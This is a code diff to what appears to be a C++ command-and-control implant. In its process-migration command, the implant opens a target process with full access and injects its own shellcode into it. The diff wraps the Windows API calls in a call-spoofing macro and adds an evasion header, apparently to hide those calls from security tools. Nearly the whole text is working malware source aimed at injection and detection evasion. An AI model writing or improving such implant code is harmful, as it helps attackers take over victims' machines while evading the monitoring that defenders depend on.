@@ -4,6 +4,7 @@
 #include <parser.h>
 #include <config.h>
 #include <strings.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_MIGRATE
 
@@ -26,7 +27,7 @@ auto declfn starburst::cmd_migrate(
 
     DBG_PRINT( inst, "cmd_migrate: target pid=%u\n", pid );
 
-    HANDLE h_proc = inst.kernel32.OpenProcess( PROCESS_ALL_ACCESS, FALSE, pid );
+    HANDLE h_proc = (HANDLE)SCALL( inst, kernel32.OpenProcess, PROCESS_ALL_ACCESS, FALSE, pid );
     if ( !h_proc ) {
         char msg[80] = { 0 };
         str_copy( msg, symbol<char*>( const_cast<char*>( "OpenProcess failed for PID " ) ) );
@@ -41,7 +42,7 @@ auto declfn starburst::cmd_migrate(
     auto sc_len  = static_cast<uint32_t>( inst.base.length );
 
     if ( !sc_base || sc_len == 0 ) {
-        inst.kernel32.CloseHandle( h_proc );
+        SCALL( inst, kernel32.CloseHandle, h_proc );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "agent base/length not set" ) ) );
         return;
@@ -50,14 +51,14 @@ auto declfn starburst::cmd_migrate(
     HANDLE h_thread = inject_shellcode( inst, h_proc, sc_base, sc_len );
 
     if ( !h_thread ) {
-        inst.kernel32.CloseHandle( h_proc );
+        SCALL( inst, kernel32.CloseHandle, h_proc );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "injection failed" ) ) );
         return;
     }
 
-    inst.kernel32.CloseHandle( h_thread );
-    inst.kernel32.CloseHandle( h_proc );
+    SCALL( inst, kernel32.CloseHandle, h_thread );
+    SCALL( inst, kernel32.CloseHandle, h_proc );
 
     char msg[80] = { 0 };
     str_copy( msg, symbol<char*>( const_cast<char*>( "migrated to PID " ) ) );
